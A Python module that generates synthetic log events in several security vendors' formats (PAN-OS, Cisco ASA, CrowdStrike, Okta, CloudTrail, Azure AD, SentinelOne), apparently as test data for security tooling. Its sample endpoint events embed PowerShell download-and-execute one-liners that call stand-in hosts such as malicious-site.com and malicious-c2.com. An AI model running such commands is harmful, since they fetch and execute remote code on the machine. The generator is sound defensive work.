"""
Authentic Log Format Library for Enterprise Security Vendors

This module contains real-world log formats researched from vendor documentation,
customer environments, and security community resources. Each log generator 
produces logs that match actual vendor formats for maximum Broker VM compatibility.
"""

import random
import json
import re
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from faker import Faker
from ipaddress import IPv4Address, IPv6Address

from ..core.models import BaseEvent, EndpointEvent, NetworkEvent, IdentityEvent, CloudEvent
from ..core.models import NICECategory, SeverityLevel

fake = Faker()


class AuthenticLogGenerator:
    """Base class for generating authentic vendor log formats."""
    
    def __init__(self, vendor: str, product: str, nice_category: NICECategory):
        self.vendor = vendor
        self.product = product
        self.nice_category = nice_category
        self.common_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        self.malicious_domains = [
            "evil-c2-server.com", "malware-drop-site.net", "phishing-campaign.org",
            "ransomware-payment.onion", "data-exfil-site.ru", "apt-infrastructure.cn"
        ]
        self.threat_signatures = [
            "MALWARE.Emotet.Variant", "EXPLOIT.CVE-2021-44228.Log4Shell",
            "BACKDOOR.Cobalt.Strike.Beacon", "TROJAN.Qbot.Banking",
            "RANSOMWARE.Ryuk.Encryption", "APT.Lazarus.Implant"
        ]


# === PALO ALTO NETWORKS ===

class PaloAltoGenerator(AuthenticLogGenerator):
    """Palo Alto Networks PAN-OS authentic log formats."""
    
    def __init__(self):
        super().__init__("Palo Alto Networks", "PAN-OS", NICECategory.NETWORK)
    
    def generate_traffic_log_allowed(self) -> NetworkEvent:
        """PAN-OS Traffic Log - Connection Allowed."""
        # Real PAN-OS traffic log format
        serial = f"01{random.randint(1000000000, 9999999999)}"
        session_id = random.randint(100000, 999999)
        
        log_message = (
            f"1,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},{serial},"
            f"TRAFFIC,end,2305,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},"
            f"{fake.ipv4_private()},{fake.ipv4()},{fake.ipv4_private()},{fake.ipv4()},"
            f"Allow-Internal-to-DMZ,{fake.user_name()},,web-browsing,vsys1,"
            f"Internal,DMZ,ethernet1/1,ethernet1/2,LOG-Default,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},"
            f"{session_id},1,{random.randint(50000, 60000)},{random.choice([80, 443])},0,0,0x19,tcp,"
            f"allow,{random.randint(1000, 10000)},{random.randint(500, 5000)},{random.randint(10, 100)},{random.randint(5, 50)},"
            f"{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},30,any,0,{random.randint(1000000, 9999999)},0x0,US,Reserved,0,1,0,policy-deny,0,0,0,0,,PAN-OS-10.1.0,"
            f"from-policy,,,0,,0,,N/A,0,0,0,0"
        )
        
        return NetworkEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="TRAFFIC",
            event_code="1",
            severity=SeverityLevel.INFO,
            message=log_message,
            source_ip=fake.ipv4_private(),
            destination_ip=fake.ipv4(),
            source_port=random.randint(50000, 60000),
            destination_port=random.choice([80, 443]),
            protocol="tcp",
            direction="outbound",
            labels={
                "action": "allow",
                "rule": "Allow-Internal-to-DMZ",
                "application": "web-browsing",
                "serial": serial,
                "session_id": str(session_id)
            },
            bytes_in=random.randint(1000, 10000),
            bytes_out=random.randint(500, 5000),
            pattern_id="T1071.001_WEB_PROTOCOLS"
        )
    
    def generate_threat_log_malware(self) -> NetworkEvent:
        """PAN-OS Threat Log - Malware Detection."""
        serial = f"01{random.randint(1000000000, 9999999999)}"
        threat_id = random.randint(40000, 50000)
        
        log_message = (
            f"1,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},{serial},"
            f"THREAT,file,2305,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},"
            f"{fake.ipv4_private()},{fake.ipv4()},{fake.ipv4_private()},{fake.ipv4()},"
            f"Block-Malware,{fake.user_name()},,ssl,vsys1,"
            f"Internal,External,ethernet1/1,ethernet1/3,LOG-Default,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},"
            f"{random.randint(100000, 999999)},1,{random.randint(50000, 60000)},443,"
            f"0,0,0x80004000,tcp,block-url,\"{random.choice(self.threat_signatures)}\",(9999),Malware,"
            f"informational,client-to-server,{threat_id},0x0,US,Reserved,0,"
            f"text/html,malicious-file.exe,{fake.file_name(extension='exe')}"
        )
        
        return NetworkEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="THREAT",
            event_code="file",
            severity=SeverityLevel.CRITICAL,
            message=log_message,
            source_ip=fake.ipv4_private(),
            destination_ip=fake.ipv4(),
            protocol="tcp",
            direction="outbound",
            domain=random.choice(self.malicious_domains),
            labels={
                "action": "block-url",
                "threat_name": random.choice(self.threat_signatures),
                "threat_id": str(threat_id),
                "category": "Malware",
                "serial": serial
            },
            pattern_id="T1566.001_PHISHING_ATTACHMENT"
        )
    
    def generate_url_filtering_log(self) -> NetworkEvent:
        """PAN-OS URL Filtering Log."""
        serial = f"01{random.randint(1000000000, 9999999999)}"
        
        log_message = (
            f"1,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},{serial},"
            f"THREAT,url,2305,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},"
            f"{fake.ipv4_private()},{fake.ipv4()},{fake.ipv4_private()},{fake.ipv4()},"
            f"URL-Filtering-Policy,{fake.user_name()},,web-browsing,vsys1,"
            f"Internal,External,ethernet1/1,ethernet1/3,LOG-Default,{datetime.now().strftime('%Y/%m/%d %H:%M:%S')},"
            f"{random.randint(100000, 999999)},1,{random.randint(50000, 60000)},80,"
            f"0,0,0x400000,tcp,block-url,\"malicious-url.com/exploit\",(9999),malware,"
            f"high,client-to-server,{random.randint(40000, 50000)},0x0,US,Reserved,"
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64),text/html"
        )
        
        return NetworkEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="THREAT",
            event_code="url",
            severity=SeverityLevel.WARNING,
            message=log_message,
            source_ip=fake.ipv4_private(),
            destination_ip=fake.ipv4(),
            protocol="tcp",
            direction="outbound",
            url=f"http://{random.choice(self.malicious_domains)}/exploit",
            labels={
                "action": "block-url",
                "category": "malware",
                "severity": "high",
                "serial": serial
            },
            pattern_id="T1071.001_WEB_PROTOCOLS"
        )


# === CISCO ASA ===

class CiscoASAGenerator(AuthenticLogGenerator):
    """Cisco ASA Firewall authentic log formats."""
    
    def __init__(self):
        super().__init__("Cisco", "ASA", NICECategory.NETWORK)
    
    def generate_connection_denied_log(self) -> NetworkEvent:
        """Cisco ASA Connection Denied Log."""
        message_id = "106023"
        
        log_message = (
            f"%ASA-{random.choice([4, 5])}-{message_id}: "
            f"Deny tcp src outside:{fake.ipv4()}/{random.choice([80, 443])} "
            f"dst inside:{fake.ipv4_private()}/{random.randint(1024, 65535)} "
            f"by access-group \"outside_access_in\" [0x{random.randint(10000000, 99999999):08x}, 0x0]"
        )
        
        return NetworkEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="Connection Denied",
            event_code=message_id,
            severity=SeverityLevel.WARNING,
            message=log_message,
            source_ip=fake.ipv4(),
            destination_ip=fake.ipv4_private(),
            source_port=random.choice([80, 443]),
            destination_port=random.randint(1024, 65535),
            protocol="tcp",
            direction="inbound",
            labels={
                "action": "deny",
                "reason": "access-group",
                "rule": "outside_access_in",
                "interface": "outside"
            },
            pattern_id="T1046_NETWORK_SERVICE_SCANNING"
        )
    
    def generate_vpn_authentication_log(self) -> NetworkEvent:
        """Cisco ASA VPN Authentication Log."""
        username = fake.user_name()
        session_id = random.randint(1000, 9999)
        
        log_message = (
            f"%ASA-6-722051: Group <VPN_Users> User <{username}> "
            f"IP <{fake.ipv4()}> IPv4 Address <{fake.ipv4_private()}> "
            f"IPv6 address <::> assigned to session"
        )
        
        return NetworkEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="VPN Session Established",
            event_code="722051",
            severity=SeverityLevel.INFO,
            message=log_message,
            source_ip=fake.ipv4(),
            labels={
                "action": "vpn_connect",
                "username": username,
                "group": "VPN_Users",
                "session_id": str(session_id),
                "assigned_ip": fake.ipv4_private()
            },
            pattern_id="T1078_VALID_ACCOUNTS"
        )
    
    def generate_threat_detection_log(self) -> NetworkEvent:
        """Cisco ASA Threat Detection Log."""
        log_message = (
            f"%ASA-4-733100: [Scanning] drop rate-1 exceeded. "
            f"Current burst rate is {random.randint(100, 1000)} per second, "
            f"max configured rate is 100; Current average rate is {random.randint(50, 200)} per second, "
            f"max configured rate is 10; Cumulative total count is {random.randint(10000, 99999)}"
        )
        
        return NetworkEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="Scanning Attack",
            event_code="733100",
            severity=SeverityLevel.WARNING,
            message=log_message,
            source_ip=fake.ipv4(),
            labels={
                "action": "drop",
                "attack_type": "scanning",
                "rate_exceeded": "true",
                "threat_detected": "true"
            },
            pattern_id="T1046_NETWORK_SERVICE_SCANNING"
        )


# === CROWDSTRIKE FALCON ===

class CrowdStrikeGenerator(AuthenticLogGenerator):
    """CrowdStrike Falcon EDR authentic log formats."""
    
    def __init__(self):
        super().__init__("CrowdStrike", "Falcon", NICECategory.ENDPOINT)
    
    def generate_process_creation_log(self) -> EndpointEvent:
        """CrowdStrike Process Creation Event."""
        aid = f"{random.randint(100000000000000000000000000000, 999999999999999999999999999999):032x}"
        cid = f"{random.randint(100000000000000000000000000000, 999999999999999999999999999999):032x}"
        
        event_data = {
            "metadata": {
                "eventType": "ProcessRollup2",
                "eventCreationTime": int(datetime.now().timestamp() * 1000),
                "offset": random.randint(1000000, 9999999),
                "customerIDString": cid,
                "version": "1.0"
            },
            "event": {
                "ProcessRollup2": {
                    "aid": aid,
                    "aip": fake.ipv4_private(),
                    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')\"",
                    "ComputerName": fake.hostname().upper(),
                    "ProcessId": random.randint(1000, 9999),
                    "ParentProcessId": random.randint(500, 999),
                    "ProcessStartTime": int(datetime.now().timestamp()),
                    "SHA256HashData": f"{random.randint(10**63, 10**64-1):064x}",
                    "FileName": "powershell.exe",
                    "FilePath": "\\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "UserName": f"{fake.hostname()}\\{fake.user_name()}",
                    "UserSid": f"S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(1000, 9999)}"
                }
            }
        }
        
        return EndpointEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="ProcessRollup2",
            event_code="ProcessRollup2",
            severity=SeverityLevel.WARNING,
            message=json.dumps(event_data),
            source_ip=fake.ipv4_private(),
            labels={
                "aid": aid,
                "cid": cid,
                "tactic": "Execution",
                "technique": "T1059.001"
            },
            process_name="powershell.exe",
            process_id=event_data["event"]["ProcessRollup2"]["ProcessId"],
            parent_process_id=event_data["event"]["ProcessRollup2"]["ParentProcessId"],
            command_line=event_data["event"]["ProcessRollup2"]["CommandLine"],
            file_path=event_data["event"]["ProcessRollup2"]["FilePath"],
            process_sha256=event_data["event"]["ProcessRollup2"]["SHA256HashData"],
            pattern_id="T1059.001_POWERSHELL"
        )
    
    def generate_network_connection_log(self) -> EndpointEvent:
        """CrowdStrike Network Connection Event."""
        aid = f"{random.randint(100000000000000000000000000000, 999999999999999999999999999999):032x}"
        
        event_data = {
            "metadata": {
                "eventType": "NetworkConnectIP4",
                "eventCreationTime": int(datetime.now().timestamp() * 1000),
                "customerIDString": f"{random.randint(100000000000000000000000000000, 999999999999999999999999999999):032x}"
            },
            "event": {
                "NetworkConnectIP4": {
                    "aid": aid,
                    "aip": fake.ipv4_private(),
                    "LocalAddress": fake.ipv4_private(),
                    "LocalPort": random.randint(49152, 65535),
                    "RemoteAddress": random.choice(self.malicious_domains),
                    "RemotePort": 443,
                    "Protocol": 6,  # TCP
                    "ConnectionFlags": 2,
                    "ProcessId": random.randint(1000, 9999),
                    "Timestamp": int(datetime.now().timestamp()),
                    "ComputerName": fake.hostname().upper()
                }
            }
        }
        
        return EndpointEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="NetworkConnectIP4",
            event_code="NetworkConnectIP4",
            severity=SeverityLevel.WARNING,
            message=json.dumps(event_data),
            source_ip=fake.ipv4_private(),
            destination_ip=random.choice(self.malicious_domains),
            source_port=event_data["event"]["NetworkConnectIP4"]["LocalPort"],
            destination_port=443,
            protocol="TCP",
            labels={
                "aid": aid,
                "connection_flags": "2",
                "suspicious_domain": "true"
            },
            process_id=event_data["event"]["NetworkConnectIP4"]["ProcessId"],
            pattern_id="T1071.001_WEB_PROTOCOLS"
        )
    
    def generate_detection_summary_log(self) -> EndpointEvent:
        """CrowdStrike Detection Summary Event."""
        detection_id = f"{random.randint(10000000000000000000, 99999999999999999999)}"
        
        event_data = {
            "metadata": {
                "eventType": "DetectionSummaryEvent",
                "eventCreationTime": int(datetime.now().timestamp() * 1000),
                "version": "1.0"
            },
            "event": {
                "DetectionSummaryEvent": {
                    "DetectId": detection_id,
                    "DetectName": "Process hollowing detected",
                    "DetectDescription": "A process was detected attempting to perform process hollowing, which is commonly used by malware to execute code in the context of a legitimate process.",
                    "Severity": 70,
                    "MaxSeverity": 70,
                    "MaxConfidence": 80,
                    "ComputerName": fake.hostname().upper(),
                    "UserName": f"{fake.hostname()}\\{fake.user_name()}",
                    "ProcessId": random.randint(1000, 9999),
                    "FileName": "legitimate_process.exe",
                    "FilePath": f"C:\\Program Files\\{fake.company()}\\legitimate_process.exe",
                    "CommandLine": f"C:\\Program Files\\{fake.company()}\\legitimate_process.exe",
                    "MD5String": fake.md5(),
                    "SHA256String": f"{random.randint(10**63, 10**64-1):064x}",
                    "Tactic": "Defense Evasion",
                    "Technique": "Process Hollowing"
                }
            }
        }
        
        return EndpointEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="DetectionSummaryEvent",
            event_code="DetectionSummaryEvent",
            severity=SeverityLevel.CRITICAL,
            message=json.dumps(event_data),
            source_ip=fake.ipv4_private(),
            labels={
                "detection_id": detection_id,
                "tactic": "Defense Evasion",
                "technique": "Process Hollowing",
                "confidence": "80",
                "severity_score": "70"
            },
            process_name="legitimate_process.exe",
            process_id=event_data["event"]["DetectionSummaryEvent"]["ProcessId"],
            command_line=event_data["event"]["DetectionSummaryEvent"]["CommandLine"],
            file_path=event_data["event"]["DetectionSummaryEvent"]["FilePath"],
            process_sha256=event_data["event"]["DetectionSummaryEvent"]["SHA256String"],
            pattern_id="T1055_PROCESS_INJECTION"
        )


# === OKTA SYSTEM LOG ===

class OktaGenerator(AuthenticLogGenerator):
    """Okta System Log authentic formats."""
    
    def __init__(self):
        super().__init__("Okta", "System Log", NICECategory.IDENTITY)
    
    def generate_user_authentication_log(self) -> IdentityEvent:
        """Okta User Authentication Event."""
        username = fake.user_name()
        session_id = fake.uuid4()
        
        event_data = {
            "uuid": fake.uuid4(),
            "published": datetime.now(timezone.utc).isoformat(),
            "eventType": "user.authentication.sso",
            "version": "0",
            "severity": "INFO",
            "legacyEventType": "core.user_auth.login_success",
            "displayMessage": f"User login to Okta",
            "actor": {
                "id": fake.uuid4(),
                "type": "User",
                "alternateId": f"{username}@company.com",
                "displayName": fake.name(),
                "detailEntry": None
            },
            "client": {
                "userAgent": {
                    "rawUserAgent": random.choice(self.common_user_agents),
                    "os": "Windows",
                    "browser": "CHROME"
                },
                "zone": "LegacyIpZone",
                "device": "Computer",
                "id": None,
                "ipAddress": fake.ipv4(),
                "geographicalContext": {
                    "city": fake.city(),
                    "state": fake.state(),
                    "country": "United States",
                    "postalCode": fake.zipcode(),
                    "geolocation": {
                        "lat": float(fake.latitude()),
                        "lon": float(fake.longitude())
                    }
                }
            },
            "outcome": {
                "result": "SUCCESS",
                "reason": None
            },
            "target": [
                {
                    "id": fake.uuid4(),
                    "type": "User",
                    "alternateId": f"{username}@company.com",
                    "displayName": fake.name(),
                    "detailEntry": None
                }
            ],
            "transaction": {
                "type": "WEB",
                "id": fake.uuid4(),
                "detail": {}
            },
            "debugContext": {
                "debugData": {
                    "deviceFingerprint": f"fp_{random.randint(10000000, 99999999)}",
                    "requestId": fake.uuid4(),
                    "requestUri": "/api/v1/authn",
                    "threatSuspected": "false",
                    "url": "/api/v1/authn?"
                }
            },
            "authenticationContext": {
                "authenticationProvider": "OKTA_AUTHENTICATION_PROVIDER",
                "authenticationStep": 0,
                "externalSessionId": session_id,
                "interface": "Okta Dashboard",
                "issuer": None
            },
            "securityContext": {
                "asNumber": random.randint(1000, 99999),
                "asOrg": fake.company(),
                "isp": "Internet Service Provider",
                "domain": fake.domain_name(),
                "isProxy": False
            }
        }
        
        return IdentityEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="user.authentication.sso",
            event_code="SUCCESS",
            severity=SeverityLevel.INFO,
            message=json.dumps(event_data),
            source_ip=fake.ipv4(),
            labels={
                "event_type": "user.authentication.sso",
                "result": "SUCCESS",
                "user_agent": "Chrome",
                "authentication_provider": "OKTA_AUTHENTICATION_PROVIDER"
            },
            auth_method="PASSWORD",
            session_id=session_id,
            application="Okta Dashboard",
            pattern_id="T1078.004_VALID_ACCOUNTS_CLOUD"
        )
    
    def generate_suspicious_activity_log(self) -> IdentityEvent:
        """Okta Suspicious Activity Detection."""
        username = fake.user_name()
        
        event_data = {
            "uuid": fake.uuid4(),
            "published": datetime.now(timezone.utc).isoformat(),
            "eventType": "security.threat.detected",
            "version": "0",
            "severity": "WARN",
            "legacyEventType": "security.threat.detected",
            "displayMessage": "Threat detected: New Geolocation",
            "actor": {
                "id": fake.uuid4(),
                "type": "User",
                "alternateId": f"{username}@company.com",
                "displayName": fake.name()
            },
            "client": {
                "userAgent": {
                    "rawUserAgent": random.choice(self.common_user_agents),
                    "os": "Unknown",
                    "browser": "UNKNOWN"
                },
                "zone": "BlockedIpZone",
                "device": "Computer",
                "id": None,
                "ipAddress": "185.220.101.3",  # Known Tor exit node
                "geographicalContext": {
                    "city": "Moscow",
                    "state": "Moscow",
                    "country": "Russia",
                    "postalCode": "101000",
                    "geolocation": {
                        "lat": 55.7558,
                        "lon": 37.6173
                    }
                }
            },
            "outcome": {
                "result": "SUCCESS",
                "reason": "Threat detected but access allowed"
            },
            "debugContext": {
                "debugData": {
                    "threatDetected": "New Geolocation",
                    "riskScore": "HIGH",
                    "riskReasons": ["New Geolocation", "Anonymous Proxy"],
                    "previousSignOn": {
                        "city": "New York",
                        "country": "United States"
                    }
                }
            },
            "securityContext": {
                "asNumber": 13335,
                "asOrg": "Cloudflare",
                "isp": "Cloudflare",
                "domain": "cloudflare.com",
                "isProxy": True
            }
        }
        
        return IdentityEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="security.threat.detected",
            event_code="THREAT_DETECTED",
            severity=SeverityLevel.CRITICAL,
            message=json.dumps(event_data),
            source_ip="185.220.101.3",
            labels={
                "event_type": "security.threat.detected",
                "threat_type": "New Geolocation",
                "risk_score": "HIGH",
                "country": "Russia",
                "is_proxy": "true"
            },
            risk_score=9.5,
            pattern_id="T1078.004_VALID_ACCOUNTS_CLOUD"
        )


# === AWS CLOUDTRAIL ===

class AWSCloudTrailGenerator(AuthenticLogGenerator):
    """AWS CloudTrail authentic log formats."""
    
    def __init__(self):
        super().__init__("AWS", "CloudTrail", NICECategory.CLOUD)
    
    def generate_console_login_log(self) -> CloudEvent:
        """AWS Console Login Event."""
        username = fake.user_name()
        account_id = str(random.randint(100000000000, 999999999999))
        
        event_data = {
            "eventVersion": "1.08",
            "userIdentity": {
                "type": "Root",
                "principalId": f"AIDACKCEVSQ6C2EXAMPLE",
                "arn": f"arn:aws:iam::{account_id}:root",
                "accountId": account_id,
                "accessKeyId": "",
                "userName": username
            },
            "eventTime": datetime.now(timezone.utc).isoformat(),
            "eventSource": "signin.amazonaws.com",
            "eventName": "ConsoleLogin",
            "awsRegion": "us-east-1",
            "sourceIPAddress": fake.ipv4(),
            "userAgent": random.choice(self.common_user_agents),
            "requestParameters": None,
            "responseElements": {
                "ConsoleLogin": "Success"
            },
            "additionalEventData": {
                "LoginTo": "https://console.aws.amazon.com/console/home?state=hashArgs%23&isauthcode=true",
                "MobileVersion": "No",
                "MFAUsed": "No"
            },
            "eventID": fake.uuid4(),
            "eventType": "AwsConsoleSignIn",
            "apiVersion": "1.0",
            "managementEvent": True,
            "recipientAccountId": account_id,
            "eventCategory": "Management"
        }
        
        return CloudEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="ConsoleLogin",
            event_code="Success",
            severity=SeverityLevel.INFO,
            message=json.dumps(event_data),
            source_ip=fake.ipv4(),
            labels={
                "event_source": "signin.amazonaws.com",
                "event_name": "ConsoleLogin",
                "user_type": "Root",
                "mfa_used": "No",
                "response": "Success"
            },
            cloud_provider="AWS",
            account_id=account_id,
            region="us-east-1",
            service_name="signin.amazonaws.com",
            api_call="ConsoleLogin",
            user_identity_type="Root",
            pattern_id="T1078.004_VALID_ACCOUNTS_CLOUD"
        )
    
    def generate_iam_policy_change_log(self) -> CloudEvent:
        """AWS IAM Policy Change Event."""
        username = fake.user_name()
        account_id = str(random.randint(100000000000, 999999999999))
        policy_name = "AdminAccessPolicy"
        
        event_data = {
            "eventVersion": "1.08",
            "userIdentity": {
                "type": "IAMUser",
                "principalId": f"AIDAI{random.randint(100000000000000, 999999999999999)}",
                "arn": f"arn:aws:iam::{account_id}:user/{username}",
                "accountId": account_id,
                "accessKeyId": f"AKIA{random.randint(100000000000000, 999999999999999)}",
                "userName": username
            },
            "eventTime": datetime.now(timezone.utc).isoformat(),
            "eventSource": "iam.amazonaws.com",
            "eventName": "AttachUserPolicy",
            "awsRegion": "us-east-1",
            "sourceIPAddress": fake.ipv4(),
            "userAgent": "aws-cli/2.13.0 Python/3.11.4 Linux/5.4.0-150-generic exe/x86_64.ubuntu.20 prompt/off command/iam.attach-user-policy",
            "requestParameters": {
                "userName": "backdoor-user",
                "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
            },
            "responseElements": None,
            "requestID": fake.uuid4(),
            "eventID": fake.uuid4(),
            "eventType": "AwsApiCall",
            "apiVersion": "2010-05-08",
            "managementEvent": True,
            "recipientAccountId": account_id,
            "eventCategory": "Management"
        }
        
        return CloudEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="AttachUserPolicy",
            event_code="Success",
            severity=SeverityLevel.CRITICAL,
            message=json.dumps(event_data),
            source_ip=fake.ipv4(),
            labels={
                "event_source": "iam.amazonaws.com",
                "event_name": "AttachUserPolicy",
                "target_user": "backdoor-user",
                "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess",
                "high_privilege": "true"
            },
            cloud_provider="AWS",
            account_id=account_id,
            region="us-east-1",
            service_name="iam.amazonaws.com",
            api_call="AttachUserPolicy",
            user_identity_type="IAMUser",
            pattern_id="T1098_ACCOUNT_MANIPULATION"
        )


# === AZURE ACTIVE DIRECTORY ===

class AzureADGenerator(AuthenticLogGenerator):
    """Azure Active Directory authentic log formats."""
    
    def __init__(self):
        super().__init__("Microsoft", "Azure Active Directory", NICECategory.IDENTITY)
    
    def generate_signin_log(self) -> IdentityEvent:
        """Azure AD Sign-in Log."""
        username = fake.user_name()
        tenant_id = fake.uuid4()
        
        event_data = {
            "time": datetime.now(timezone.utc).isoformat(),
            "resourceId": f"/tenants/{tenant_id}/providers/Microsoft.aadiam",
            "operationName": "Sign-in activity",
            "operationVersion": "1.0",
            "category": "SignInLogs",
            "tenantId": tenant_id,
            "resultType": "0",
            "resultSignature": "None",
            "resultDescription": "Success",
            "durationMs": random.randint(100, 2000),
            "callerIpAddress": fake.ipv4(),
            "correlationId": fake.uuid4(),
            "identity": f"{username}@company.com",
            "Level": 4,
            "properties": {
                "id": fake.uuid4(),
                "createdDateTime": datetime.now(timezone.utc).isoformat(),
                "userDisplayName": fake.name(),
                "userPrincipalName": f"{username}@company.com",
                "userId": fake.uuid4(),
                "appId": fake.uuid4(),
                "appDisplayName": "Office 365 Exchange Online",
                "ipAddress": fake.ipv4(),
                "clientAppUsed": "Browser",
                "userAgent": random.choice(self.common_user_agents),
                "correlationId": fake.uuid4(),
                "conditionalAccessStatus": "success",
                "isInteractive": True,
                "tokenIssuerName": "",
                "tokenIssuerType": "AzureAD",
                "processingTimeInMilliseconds": random.randint(50, 500),
                "riskDetail": "none",
                "riskLevelAggregated": "none",
                "riskLevelDuringSignIn": "none",
                "riskState": "none",
                "riskEventTypes": [],
                "resourceDisplayName": "Office 365 Exchange Online",
                "resourceId": fake.uuid4(),
                "authenticationMethodsUsed": ["Password"],
                "authenticationRequirement": "singleFactorAuthentication",
                "signInIdentifier": f"{username}@company.com",
                "signInIdentifierType": "userPrincipalName",
                "servicePrincipalId": "",
                "userType": "member",
                "flaggedForReview": False,
                "isTenantRestricted": False,
                "autonomousSystemNumber": random.randint(1000, 99999),
                "crossTenantAccessType": "none",
                "location": {
                    "city": fake.city(),
                    "state": fake.state(),
                    "countryOrRegion": "US",
                    "geoCoordinates": {
                        "altitude": None,
                        "latitude": float(fake.latitude()),
                        "longitude": float(fake.longitude())
                    }
                },
                "deviceDetail": {
                    "deviceId": "",
                    "displayName": "",
                    "operatingSystem": "Windows",
                    "browser": "Chrome",
                    "isCompliant": None,
                    "isManaged": None,
                    "trustType": ""
                },
                "status": {
                    "errorCode": 0,
                    "failureReason": "",
                    "additionalDetails": ""
                }
            }
        }
        
        return IdentityEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="Sign-in activity",
            event_code="0",
            severity=SeverityLevel.INFO,
            message=json.dumps(event_data),
            source_ip=fake.ipv4(),
            labels={
                "operation_name": "Sign-in activity",
                "result_type": "0",
                "result_description": "Success",
                "client_app": "Browser",
                "conditional_access": "success",
                "risk_level": "none"
            },
            auth_method="Password",
            session_id=event_data["properties"]["correlationId"],
            application="Office 365 Exchange Online",
            resource="Office 365 Exchange Online",
            pattern_id="T1078.004_VALID_ACCOUNTS_CLOUD"
        )
    
    def generate_risky_signin_log(self) -> IdentityEvent:
        """Azure AD Risky Sign-in Detection."""
        username = fake.user_name()
        
        event_data = {
            "time": datetime.now(timezone.utc).isoformat(),
            "category": "SignInLogs",
            "operationName": "Sign-in activity",
            "resultType": "0",
            "callerIpAddress": "185.220.101.3",  # Known Tor exit
            "properties": {
                "userPrincipalName": f"{username}@company.com",
                "riskDetail": "userPerformedSecuredPasswordReset",
                "riskLevelAggregated": "high",
                "riskLevelDuringSignIn": "high",
                "riskState": "atRisk",
                "riskEventTypes": ["anonymizedIPAddress", "unfamiliarFeatures"],
                "location": {
                    "city": "Moscow",
                    "state": "Moscow",
                    "countryOrRegion": "RU"
                },
                "deviceDetail": {
                    "operatingSystem": "Linux",
                    "browser": "Tor",
                    "isCompliant": False,
                    "isManaged": False
                },
                "conditionalAccessStatus": "failure"
            }
        }
        
        return IdentityEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="Sign-in activity",
            event_code="0",
            severity=SeverityLevel.CRITICAL,
            message=json.dumps(event_data),
            source_ip="185.220.101.3",
            labels={
                "risk_level": "high",
                "risk_state": "atRisk",
                "risk_events": "anonymizedIPAddress,unfamiliarFeatures",
                "country": "RU",
                "conditional_access": "failure"
            },
            risk_score=9.0,
            pattern_id="T1078.004_VALID_ACCOUNTS_CLOUD"
        )


# === SENTINELONE ===

class SentinelOneGenerator(AuthenticLogGenerator):
    """SentinelOne EDR authentic log formats."""
    
    def __init__(self):
        super().__init__("SentinelOne", "Singularity", NICECategory.ENDPOINT)
    
    def generate_threat_detection_log(self) -> EndpointEvent:
        """SentinelOne Threat Detection Event."""
        agent_id = fake.uuid4()
        
        event_data = {
            "agentComputerName": fake.hostname().upper(),
            "agentDomain": "CORP",
            "agentGroupId": fake.uuid4(),
            "agentId": agent_id,
            "agentInfected": True,
            "agentIp": fake.ipv4_private(),
            "agentIsActive": True,
            "agentIsDecommissioned": False,
            "agentMachineType": "desktop",
            "agentNetworkStatus": "connected",
            "agentOsType": "windows",
            "agentVersion": "22.3.2.12345",
            "classification": "Malware",
            "classificationSource": "Static",
            "createdAt": datetime.now(timezone.utc).isoformat(),
            "description": "Malicious PowerShell script detected and mitigated",
            "engines": ["reputation", "static_ai"],
            "fileContentHash": f"{random.randint(10**63, 10**64-1):064x}",
            "filePath": "C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\malicious_script.ps1",
            "fromCloud": False,
            "fromScan": False,
            "id": fake.uuid4(),
            "indicators": [
                {
                    "category": "Registry",
                    "description": "Registry modification for persistence",
                    "ids": [random.randint(1000, 9999)],
                    "tactics": ["Persistence"]
                }
            ],
            "maliciousGroupId": fake.uuid4(),
            "maliciousProcessArguments": "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {$a='http://malicious-c2.com/payload';$b=New-Object System.Net.WebClient;$c=$b.DownloadString($a);Invoke-Expression $c}\"",
            "markedAsBenign": False,
            "mitigationMode": "protect",
            "mitigationReport": {
                "kill": {
                    "status": "success"
                },
                "quarantine": {
                    "status": "success"
                },
                "remediate": {
                    "status": "success"
                }
            },
            "mitigationStatus": "mitigated",
            "rank": random.randint(7, 10),
            "resolved": False,
            "siteId": fake.uuid4(),
            "siteName": "Corporate Network",
            "threatName": "Trojan.PowerShell.Generic",
            "updatedAt": datetime.now(timezone.utc).isoformat(),
            "username": f"CORP\\{fake.user_name()}"
        }
        
        return EndpointEvent(
            vendor=self.vendor,
            product=self.product,
            event_name="Threat Detection",
            event_code="THREAT_DETECTED",
            severity=SeverityLevel.CRITICAL,
